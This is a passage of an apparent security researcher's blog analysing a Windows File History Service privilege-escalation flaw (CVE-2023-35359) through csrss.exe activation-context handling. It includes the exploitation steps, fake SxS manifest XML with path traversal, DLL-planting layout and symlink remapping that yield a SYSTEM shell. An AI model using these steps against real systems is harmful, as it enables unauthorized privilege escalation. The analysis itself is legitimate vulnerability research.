Q[CClassCache::GetClassObjectActivator]\n    R[CClassCache::CClassEntry::CreateDllClassEntry]\n    S[CClassCache::CDllPathEntry::Create]\n    T[CClassCache::CDllPathEntry::LoadDll]\n    U[LoadLibraryWithLogging]\n    V[LoadLibraryExW]\n\n    A --\u003e B\n    B --\u003e C\n    C --\u003e D\n    D --\u003e E\n    E --\u003e F\n    F --\u003e G\n    G --\u003e H\n    H --\u003e I\n    I --\u003e J\n    J --\u003e K\n    K --\u003e L\n    L --\u003e M\n    M --\u003e N\n    N --\u003e O\n    O --\u003e P\n    P --\u003e Q\n    Q --\u003e R\n    R --\u003e S\n    S --\u003e T\n    T --\u003e U\n    U --\u003e V\n```\n\n\u003e **Note:** The vulnerability only occurs when the **DLL** being loaded under **impersonation** has a **Side-by-Side (SxS) manifest** file embedded inside it.\n\nBelow is the call flow of `LoadLibraryExW` when the **DLL** has **SxS manifest**:\n\n```mermaid\ngraph TD\n    A[LoadLibraryExW]\n    B[LdrLoadDll]\n    C[LdrpLoadDllInternal]\n    D[LdrpProcessWork]\n    E[LdrpMapDllFullPath]\n    F[LdrpMapDllNtFileName]\n    G[LdrpMapDllWithSectionHandle]\n    H[LdrpMapAndSnapDependency]\n    I[LdrpFindDllActivationContext]\n    J[BasepProbeForDllManifest]\n    K[CreateActCtxW]\n    L[CreateActCtxWWorker]\n    M[BasepCreateActCtx]\n\n    A --\u003e B\n    B --\u003e C\n    C --\u003e D\n    D --\u003e E\n    E --\u003e F\n    F --\u003e G\n    G --\u003e H\n    H --\u003e I\n    I --\u003e J\n    J --\u003e K\n    K --\u003e L\n    L --\u003e M\n```\n\n## Root Cause Analysis\n\nWhen a process starts in **Windows**, it registers with the **Client/Server Runtime Subsystem (CSRSS)** of the respective **session**, establishes an **Activation Context** for **Side-by-Side Assembly**, etc. The process of creating an **Activation Context** involves calling `BasepCreateActCtx` from `kernel32.dll`.\n\nThe call flow which handles the **Activation Context** messages in `csrss.exe`, looks like this:\n\n```mermaid\ngraph TD\n    A[CsrApiRequestThread]\n    B[BaseSrvSxsCreateActivationContext]\n    C[BaseSrvSxsCreateActivationContextFromMessage]\n    D[BaseSrvSxsCreateActivationContextFromStructEx]\n    E[CsrImpersonateClient]\n    F[SxsGenerateActivationContext]\n    G[CsrRevertToSelf]\n\n    A --\u003e|1| B\n    B --\u003e|2| C\n    C --\u003e|3| D\n    D --\u003e|4| E\n    D --\u003e|5| F\n    D --\u003e|6| G\n```\n\nThe message being sent to `csrss.exe` is described as given below:\n\n```cpp\ntypedef struct _BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG\n{\n    ULONG Flags;\n    USHORT ProcessorArchitecture;\n    UNICODE_STRING CultureFallbacks;\n    struct _BASE_MSG_SXS_STREAM Manifest;\n    struct _BASE_MSG_SXS_STREAM Policy;\n    UNICODE_STRING AssemblyDirectory;\n    UNICODE_STRING TextualAssemblyIdentity;\n    unsigned __int64 FileTime;\n    ULONG ResourceName;\n    PVOID ActivationContextData;\n    struct _ACTIVATION_CONTEXT_RUN_LEVEL_INFORMATION RunLevel;\n    UNICODE_STRING AssemblyName;\n} BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG, *PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG;\n\ntypedef struct _BASE_MSG_SXS_STREAM\n{\n    UCHAR FileType;\n    UCHAR PathType;\n    UCHAR HandleType;\n    UNICODE_STRING Path;\n    PVOID FileHandle;\n    HANDLE Handle;\n    unsigned __int64 Offset;\n    ULONG Size;\n} BASE_MSG_SXS_STREAM, *PBASE_MSG_SXS_STREAM;\n```\n\n\u003e **Warning:** The above structure may be inaccurate and is from an older version of **Windows**. Source: \u003chttps://github.com/Fyyre/ntdll/blob/master/ntdll.h\u003e\n\nSome important members are:\n\n* `CultureFallbacks` - language and regional settings, like `en-US`.\n* `Manifest.Path` - the path of the manifest file, usually it's the binary path `C:\\Windows\\System32\\fhcfg.dll`.\n* `AssemblyDirectory` - the path of the directory where to look for assemblies, this is usually `C:\\Windows\\System32\\`.\n\n`BaseSrvSxsCreateActivationContext` in `csrss.exe` is responsible for the validation and processing of the messages that are being received.\n\nLet's look at these functions and understand what they do:\n\n```cpp\nULONG\nBaseSrvSxsCreateActivationContext(\n    IN OUT PCSR_API_MSG m,\n    IN OUT PCSR_REPLY_STATUS ReplyStatus\n    )\n{\n    return BaseSrvSxsCreateActivationContextFromMessage(m, ReplyStatus);\n}\n\nULONG\nBaseSrvSxsCreateActivationContextFromMessage(\n    IN OUT PCSR_API_MSG m,\n    IN OUT PCSR_REPLY_STATUS ReplyStatus\n    )\n{\n    PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG Message =\n        (PBASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG) \u0026m-\u003eu.ApiMessageData;\n\n    NTSTATUS Status = STATUS_SUCCESS;\n    HANDLE CsrClientProcess = NULL;\n    PCUNICODE_STRING StringsInMessageToValidate[4];\n    ULONG i = 0;\n\n    ...\n\n    StringsInMessageToValidate[0] = \u0026Message-\u003eManifest.Path;\n    StringsInMessageToValidate[1] = \u0026Message-\u003ePolicy.Path;\n    StringsInMessageToValidate[2] = \u0026Message-\u003eAssemblyDirectory;\n    StringsInMessageToValidate[3] = \u0026Message-\u003eTextualAssemblyIdentity;\n    Status = BaseSrvSxsValidateMessageStrings(m, RTL_NUMBER_OF(StringsInMessageToValidate), StringsInMessageToValidate);\n    if (!NT_SUCCESS(Status)) {\n        goto Exit;\n    }\n\n    ...\n\n    CsrClientProcess = CSR_SERVER_QUERYCLIENTTHREAD()-\u003eProcess-\u003eProcessHandle;\n\n    Status = BaseSrvSxsCreateActivationContextFromStruct(CsrClientProcess, CsrClientProcess, Message, NULL);\n    if (!NT_SUCCESS(Status)) {\n        goto Exit;\n    }\n\n    Status = STATUS_SUCCESS;\nExit:\n    ...\n    return Status;\n}\n```\n\n\u003e **Warning:** These functions are from a pretty old version of **Windows**, but it is enough to understand what's going on. Source: \u003chttps://github.com/selfrender/Windows-Server-2003/blob/master/base/win32/server/srvsxs.c\u003e\n\nIn the recent versions of **Windows** `BaseSrvSxsCreateActivationContextFromStruct` has been renamed to `BaseSrvSxsCreateActivationContextFromStructEx`.\n\n```cpp\nNTSTATUS __fastcall BaseSrvSxsCreateActivationContextFromStructEx(\n        HANDLE CsrClientProcess,\n        HANDLE SxsClientProcess,\n        BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG *Struct,\n        struct_FileInformation *FileInformation,\n        HANDLE *OutSection)\n{\n    ...\n\n    Status = BaseSrvSxsGetActivationContextGenerationFunction(\u0026FunctionPointer, \u0026Cookie);\n    ...\n    SuccessfulImpersonation = FALSE;\n    ...\n    SuccessfulImpersonation = CsrImpersonateClient(NULL);\n    ...\n    if ( !FunctionPointer(\u0026SxsDllParameters) )\n    {\n        ...\n    }\n    ...\n    if ( SuccessfulImpersonation )\n        CsrRevertToSelf();\n    ...\n    return Status;\n}\n```\n\nOne of the key things to notice in the `BaseSrvSxsCreateActivationContextFromStructEx` function is that it's generating the **Activation Context** while it's **impersonating** the **caller** using `CsrImpersonateClient`. The `FunctionPointer` is the `SxsGenerateActivationContext` function and `SxsDllParameters` is of type `SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS`.\n\n```cpp\ntypedef struct _SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS\n{\n    IN DWORD    Flags;\n    IN USHORT   ProcessorArchitecture;\n    IN LANGID   LangId;\n    IN PCWSTR   AssemblyDirectory;\n    IN PCWSTR   TextualAssemblyIdentity;\n    IN SXS_GENERATE_ACTIVATION_CONTEXT_STREAM Manifest;\n    IN SXS_GENERATE_ACTIVATION_CONTEXT_STREAM Policy;\n    OUT DWORD   SystemDefaultActCxtGenerationResult;\n    PSXS_IMPERSONATION_CALLBACK ImpersonationCallback;\n    PVOID                       ImpersonationContext;\n    OUT HANDLE  SectionObjectHandle;\n} SXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS, *PSXS_GENERATE_ACTIVATION_CONTEXT_PARAMETERS;\n\ntypedef struct _SXS_GENERATE_ACTIVATION_CONTEXT_STREAM\n{\n    IStream* Stream;\n    PCWSTR  Path;\n    ULONG   PathType;\n} SXS_GENERATE_ACTIVATION_CONTEXT_STREAM;\n```\n\nAs you can see from the **structure** definitions, the `SxsDllParameters` has `AssemblyDirectory`, `Manifest.Path` inside it.\n\nWhen operations are performed on the `Manifest.Path`, effectively it can be **redirected** to a **different location** using the user's `DosDevices` **remapping**. This attack involves **remapping** `\\??\\C:` symbolic link to a path where the **low privileged** user has the **write access** like `\\GLOBAL??\\C:\\Users\\Public\\test`.\n\nNow, let's see what the overall process looks like:\n\n```mermaid\ngraph TB\n    subgraph \"svchost.exe\"\n        IMPERSONATE[\"Impersonate Caller\"] -- \"1\\nInitiates DLL Load\" --\u003e LOADLIBRARY_FHCFG[\"LoadLibrary('C:\\Windows\\System32\\fhcfg.dll')\"]\n        LOADLIBRARY_FHCFG -- 2\\nGenerate Activation Context --\u003e SVCHOST_CREATEACTCTX[\"BasepCreateActCtx\"]\n        SVCHOST_CREATEACTCTX -- \"7\\nRead Activation Context\" --\u003e SVCHOST_ACTCTX[\"Activation Context\"]\n        LOADLIBRARY_FHCFG -- \"8\\nLoads DLL\" --\u003e DLL[\"C:\\Windows\\System32\\fhcfg.dll\"]\n        LOADLIBRARY_MPR[\"LoadLibrary('C:\\Windows\\System32\\mpr.dll')\"] -- \"9\\nRead Activation Context\" --\u003e SVCHOST_ACTCTX\n        LOADLIBRARY_MPR -- \"10\\nLoads DLL\" --\u003e LOADLIBRARY_CORRECT_MPR[\"C:\\Windows\\System32\\mpr.dll\"]\n    end\n    subgraph \"csrss.exe\"\n        CSRSS_CREATEACTCTX[\"BaseSrvSxsCreateActivationContext\"] -- 4\\nImpersonate Caller --\u003e F[\"SxsGenerateActivationContext\"]\n        F -- \"5\\nParse Manifest\" --\u003e CSRSS_DLL[\"C:\\Windows\\System32\\fhcfg.dll\"]\n    end\n    SVCHOST_CREATEACTCTX -- \"3\\nSend Message\" --\u003e CSRSS_CREATEACTCTX\n    CSRSS_CREATEACTCTX -- \"6\\nPass Activation Context\" --\u003e SVCHOST_ACTCTX\n```\n\n## Exploitation\n\nLet's see how we **File History Service LPE** **CVE-2023-35359** was exploited\n\nTo exploit this situation, we require the following things:\n\n* Create this directory layout as shown below\n\n```bash\nC:\\\n├── FakeRoot\n│   └── mpr.dll\n└── Users\n    └── Public\n        └── test\n            ├── FakeRoot\n            │   └── FakeRoot.manifest\n            └── Windows\n                └── System32\n                    ├── fhcfg.dll\n                    └── Microsoft.Windows.Common-Controls.manifest\n```\n\n* Drop a fake `fhcfg.dll` that has the below given **fake manifest** embedded inside it\n\n```xml\n\u003cassembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"\u003e\n    \u003cdependency\u003e\n        \u003cdependentAssembly\u003e\n            \u003cassemblyIdentity\n                type=\"win32\"\n                name=\"..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\"\n                version=\"1.0.0.0\"\n                processorArchitecture=\"amd64\"\n                publicKeyToken=\"6595b64144ccf1df\"\n                language=\"*\"\n            /\u003e\n        \u003c/dependentAssembly\u003e\n    \u003c/dependency\u003e\n\u003c/assembly\u003e\n```\n\n* Drop a fake **SxS manifest** to `C:\\Users\\Public\\test\\Windows\\System32\\Microsoft.Windows.Common-Controls.manifest`\n  * This **manifest** is responsible for **redirecting** the load of `mpr.dll` to a fake location.\n\n```xml\n\u003cassembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"\u003e\n    \u003cdependency\u003e\n        \u003cdependentAssembly\u003e\n            \u003cassemblyIdentity\n                type=\"win32\"\n                name=\"..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\"\n                version=\"1.0.0.0\"\n                processorArchitecture=\"amd64\"\n                publicKeyToken=\"6595b64144ccf1df\"\n                language=\"*\"\n            /\u003e\n        \u003c/dependentAssembly\u003e\n    \u003c/dependency\u003e\n    \u003cfile name=\"mpr.dll\" /\u003e\n\u003c/assembly\u003e\n```\n\n* Drop the fake `mpr.dll` **DLL** that will be loaded by `svchost.exe` when trying to load **dependencies**\n* Create the **symbolic links**: `\\??\\C:` -\u003e `\\GLOBAL??\\C:\\Users\\Public\\test`\n* Start the `fhsvc` service\n* `svchost.exe` while **impersonating** the **caller**, calls `LoadLibrary`\n* `LoadLibrary` will send a message to the `csrss.exe` process to generate the **Activation Context**\n* `csrss.exe` while **impersonating** the **caller**, parses the **SxS manifest** of `fhcfg.dll`\n* As **symbolic links** are already in place, `csrss.exe` will follow the **symbolic link**\n* Now, it's parsing the **manifest** of the **fake** `C:\\Users\\Public\\test\\Windows\\System32\\fhcfg.dll`\n* **Fake** `fhcfg.dll` installs a **fake** `dependency` on `..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot`\n* `csrss.exe` will resolve the **fake** `dependency` and generate a **poisoned Activation Context** which **redirects** the load of `mpr.dll` from `C:\\Windows\\System32\\mpr.dll` to `C:\\FakeRoot\\mpr.dll`\n* This **poisoned Activation Context** is passed to `svchost.exe`\n* Loading of `fhcfg.dll` in `svchost.exe` is now complete\n* `svchost.exe` tries to load a dependency `C:\\Windows\\System32\\mpr.dll`, **poisoned Activation Context** is used and now `mpr.dll` is being loaded from the directory we control `C:\\FakeRoot\\mpr.dll`\n\nLet's see the trace from **Process Monitor** and understand how `csrss.exe` follows the **symbolic links**, **parses** a fake **DLL** with fake **SxS manifest**.\n\n![CSRSS symlink follow 1](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/csrss-symlink-follow-1.png)\n![CSRSS symlink follow 2](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/csrss-symlink-follow-2.png)\n\nLet's see what the overall **exploitation** process would look like:\n\n```mermaid\ngraph TB\n    subgraph \"svchost.exe\"\n        IMPERSONATE[\"Impersonate Caller\"] -- \"1\\nInitiates DLL Load\" --\u003e LOADLIBRARY_FHCFG[\"LoadLibrary('C:\\Windows\\System32\\fhcfg.dll')\"]\n        LOADLIBRARY_FHCFG -- 2\\nGenerate Activation Context --\u003e CREATEACTCTX[\"BasepCreateActCtx\"]\n        CREATEACTCTX -- \"8\\nRead Poisoned Activation Context\" --\u003e ACTCTX[\"Activation Context\"]\n        LOADLIBRARY_FHCFG -- \"9\\nLoads DLL\" --\u003e DLL[\"C:\\Windows\\System32\\fhcfg.dll\"]\n        LOADLIBRARY_MPR[\"LoadLibrary('C:\\Windows\\System32\\mpr.dll')\"] -- \"10\\nRead Poisoned Activation Context\" --\u003e ACTCTX\n        LOADLIBRARY_MPR -- \"11\\nLoads Fake DLL\" --\u003e LOADLIBRARY_FAKE_MPR[\"C:\\FakeRoot\\mpr.dll\"]\n    end\n    subgraph \"csrss.exe\"\n        CSRSS_CREATEACTCTX[\"BaseSrvSxsCreateActivationContext\"] -- 4\\nImpersonate Caller --\u003e F[\"SxsGenerateActivationContext\"]\n        F -- \"5\\nParse Manifest\" --\u003e CSRSS_DLL[\"C:\\Windows\\System32\\fhcfg.dll\"]\n        CSRSS_DLL -- \"6\\nFollow Symlink\\nParse Fake Manifest\" --\u003e CSRSS_FAKE_FHCFG_DLL[\"C:\\Users\\Public\\test\\Windows\\System32\\fhcfg.dll\"]\n    end\n    CREATEACTCTX -- \"3\\nSend Message\" --\u003e CSRSS_CREATEACTCTX\n    CSRSS_CREATEACTCTX -- \"7\\nPass Poisoned Activation Context\" --\u003e ACTCTX\n```\n\nIn this **Process Monitor** trace, we can see that one of the **DLL** loads is redirected to `C:\\FakeRoot` which loads a fake **attacker-controlled** **DLL** inside `svchost.exe` running as `NT AUTHORITY\\SYSTEM`.\n\n![svchost.exe loading arbitrary DLL](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/svchost-loading-arbitrary-dll.png)\n\nOn successful exploitation, we can launch `cmd.exe` running as `NT AUTHORITY\\SYSTEM`.\n\n![cmd.exe running as SYSTEM](/images/activation-context-hell-dosdevices-remapping-attack-under-impersonation/cmd-running-as-system.png)\n\n## SxS Tracing\n\nWe can use **SxS** tracing to understand what is happening under the hood. Below is a sample trace that shows how a **fake manifest** was parsed.\n\n```log\n=================\nBegin Activation Context Generation.\nInput Parameter:\n  Flags = 0\n  ProcessorArchitecture = AMD64\n  CultureFallBacks = en-US;en\n  ManifestPath = C:\\WINDOWS\\System32\\fhcfg.dll\n  AssemblyDirectory = C:\\WINDOWS\\System32\\\n  Application Config File =\n-----------------\nINFO: Parsing Manifest File C:\\WINDOWS\\System32\\fhcfg.dll.\n  INFO: Manifest Definition Identity is Microsoft.Windows.FileHistory.Core.ConfigManager,processorArchitecture=\"amd64\",type=\"win32\",version=\"5.1.0.0\".\n  INFO: Reference: Microsoft.Windows.Common-Controls,language=\"\u0026#x2a;\",processorArchitecture=\"\u0026#x2a;\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"6.0.0.0\"\nINFO: Resolving reference Microsoft.Windows.Common-Controls,language=\"\u0026#x2a;\",processorArchitecture=\"\u0026#x2a;\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"6.0.0.0\".\n  INFO: Resolving reference for ProcessorArchitecture AMD64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\Microsoft.Windows.Common-Controls\\6.0.0.0_en-US_6595b64144ccf1df\\Microsoft.Windows.Common-Controls.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\Microsoft.Windows.Common-Controls\\6.0.0.0_en_6595b64144ccf1df\\Microsoft.Windows.Common-Controls.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture Neutral.\n      INFO: Applying Binding Policy.\n        INFO: Auto Servicing Policy redirected assembly version.\n        INFO: Post policy assembly identity is Microsoft.Windows.Common-Controls,processorArchitecture=\"AMD64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"6.0.22621.1635\".\n      INFO: Begin assembly probing.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\WinSxS\\manifests\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.22621.1635_none_270f70857386168e.manifest.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\Microsoft.Windows.Common-Controls\\6.0.22621.1635__6595b64144ccf1df\\Microsoft.Windows.Common-Controls.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\Microsoft.Windows.Common-Controls.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\Microsoft.Windows.Common-Controls.MANIFEST.\n        INFO: Manifest found at C:\\WINDOWS\\System32\\Microsoft.Windows.Common-Controls.MANIFEST.\n      INFO: End assembly probing.\nINFO: Resolving reference Microsoft.Windows.Common-Controls.mui,language=\"\u0026#x2a;\",processorArchitecture=\"AMD64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"6.0.22621.1635\".\n  INFO: Resolving reference for ProcessorArchitecture AMD64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\Microsoft.Windows.Common-Controls.mui\\6.0.22621.1635_en-US_6595b64144ccf1df\\Microsoft.Windows.Common-Controls.mui.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\Microsoft.Windows.Common-Controls.mui\\6.0.22621.1635_en_6595b64144ccf1df\\Microsoft.Windows.Common-Controls.mui.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\nINFO: Parsing Manifest File C:\\WINDOWS\\System32\\Microsoft.Windows.Common-Controls.MANIFEST.\n  INFO: Manifest Definition Identity is (null).\n  INFO: Reference: ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\"\nINFO: Resolving reference ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\".\n  INFO: Resolving reference for ProcessorArchitecture amd64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0_en-US_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0_en_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture Neutral.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0__6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.MANIFEST.\n        INFO: Manifest found at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.MANIFEST.\n      INFO: End assembly probing.\nINFO: Resolving reference ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot.mui,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\".\n  INFO: Resolving reference for ProcessorArchitecture amd64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui\\1.0.0.0_en-US_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui\\1.0.0.0_en_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\nINFO: Parsing Manifest File C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.MANIFEST.\n  INFO: Manifest Definition Identity is (null).\n  INFO: Reference: ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\"\nINFO: Resolving reference ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\".\n  INFO: Resolving reference for ProcessorArchitecture amd64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0_en-US_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0_en_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture Neutral.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot\\1.0.0.0__6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.DLL.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.MANIFEST.\n        INFO: Manifest found at C:\\WINDOWS\\System32\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.MANIFEST.\n      INFO: End assembly probing.\nINFO: Resolving reference ..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;..\u0026#x5c;FakeRoot\u0026#x5c;FakeRoot.mui,language=\"\u0026#x2a;\",processorArchitecture=\"amd64\",publicKeyToken=\"6595b64144ccf1df\",type=\"win32\",version=\"1.0.0.0\".\n  INFO: Resolving reference for ProcessorArchitecture amd64.\n    INFO: Resolving reference for culture en-US.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui\\1.0.0.0_en-US_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui.DLL.\n        INFO: Did not find manifest for culture en-US.\n      INFO: End assembly probing.\n    INFO: Resolving reference for culture en.\n      INFO: Applying Binding Policy.\n        INFO: No publisher policy found.\n        INFO: No binding policy redirect found.\n      INFO: Begin assembly probing.\n        INFO: Did not find the assembly in WinSxS.\n        INFO: Attempt to probe manifest at C:\\WINDOWS\\assembly\\GAC_64\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui\\1.0.0.0_en_6595b64144ccf1df\\..\\..\\..\\..\\..\\..\\FakeRoot\\FakeRoot.mui.DLL.\n        INFO: Did not find manifest for culture en.\n      INFO: End assembly probing.\nINFO: Activation Context generation succeeded.\nEnd Activation Context Generation.\n```\n\n## Patch\n\n\u003chttps://twitter.com/tiraniddo/status/1699497747093807509\u003e\n\nFor those interested in a detailed analysis of the patch, the researcher `y3a` has already provided an insightful breakdown. You can read about his findings at: 